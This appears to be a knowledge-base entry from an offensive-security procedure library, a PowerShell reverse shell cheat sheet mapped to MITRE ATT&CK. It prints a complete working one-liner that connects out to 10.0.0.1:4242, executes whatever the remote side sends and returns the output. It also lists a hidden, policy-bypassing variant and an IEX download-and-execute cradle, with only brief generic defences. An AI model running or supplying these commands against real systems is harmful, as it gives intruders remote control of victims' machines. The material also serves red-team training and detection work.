---
id: 42895c72-93dd-41fd-9cac-419f6f160da5
name: Powershell Reverse Shell Cheat Sheet
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.483354+00:00'
updated_at: '2023-04-10T20:25:24.889745+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
techniques:
- '[[Remote Access Tools|T1219 - Remote Access Tools]]'
tags:
- '[[Powershell]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
commands:
- '[[Execute PowerShell reverse shell]]'
---

# Powershell Reverse Shell Cheat Sheet

## Summary

A Powershell reverse shell is a technique used to gain remote access to a target system. This cheat sheet provides several commands that can be used to establish a reverse shell connection, execute remote commands and spawn a mini reverse shell. 

To use this technique, an attacker would need to ha

## Description

# Description

A Powershell reverse shell is a technique used to gain remote access to a target system. This cheat sheet provides several commands that can be used to establish a reverse shell connection, execute remote commands and spawn a mini reverse shell. 

To use this technique, an attacker would need to have initial access to a target system and then use Powershell to establish a connection back to their own system. This allows the attacker to execute commands on the target system as if they were physically present.

The business value of this technique is that it allows an attacker to gain access to sensitive data and systems, which can be used for further attacks or for financial gain.

 

## Requirements

1. Initial access to the target system

1. Powershell installed on both the attacker and target systems

1. Network connectivity between the attacker and target systems

 

## Defense

1. Limit user permissions to prevent unauthorized access to sensitive systems and data

1. Use network segmentation to prevent lateral movement

1. Monitor network traffic for suspicious activity, such as Powershell commands

 

## Objectives

1. Establish a reverse shell connection to a target system

1. Execute remote commands on the target system

1. Spawn a mini reverse shell to bypass certain security measures

 

# Instructions

1. This command opens a reverse shell to a specified IP address and port. The IP address and port are specified within the command and can be modified as needed.

 



**Code**: [[powershell -NoP -NonI -W Hidden -Exec Bypass -Comm]]



> The command uses PowerShell to create a TCP client that connects to a specified IP address and port. Once the connection is established, the command creates a stream to send and receive data. The command then enters a loop to read data from the stream and execute it as PowerShell commands. The output of these commands is then sent back to the client through the stream. This allows the user to execute commands on the remote machine and receive the output in their local terminal. The command will continue to run until the connection is closed by either the client or server.

2. This command allows you to execute remote commands on a target machine using PowerShell. Replace '10.0.0.1' with the IP address of the target machine and '4242' with the port number that you want to use for the connection.

 



**Code**: [[powershell -nop -c "$client = New-Object System.Ne]]



> The command creates a new TCP client and connects to the specified IP address and port number. It then reads the incoming data and executes it using PowerShell. The output of the command is sent back to the client in ASCII encoding. The command continues to run until the client closes the connection.



**Command** ([[Execute PowerShell reverse shell]]):

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```



3. This command downloads and executes a PowerShell script that opens a reverse shell to a specified IP address and port. The IP address and port need to be specified in the script before execution. This script can be used to gain remote access to a target machine.

 



**Code**: [[powershell IEX (New-Object Net.WebClient).Download]]



> The 'powershell' command is used to execute PowerShell scripts on a Windows system. The 'IEX' command is a shorthand for 'Invoke-Expression' which allows the execution of PowerShell commands or scripts. The 'New-Object' command creates a new .NET object, in this case a 'Net.WebClient' object which is used to download the PowerShell script from the specified URL. The downloaded script is then executed using 'IEX'. This command should be used with caution as it can be used for malicious purposes.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]

### Techniques

- [[Remote Access Tools|T1219 - Remote Access Tools]]

## Commands Used

- [[Execute PowerShell reverse shell]]

## Tags

- [[Powershell]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]


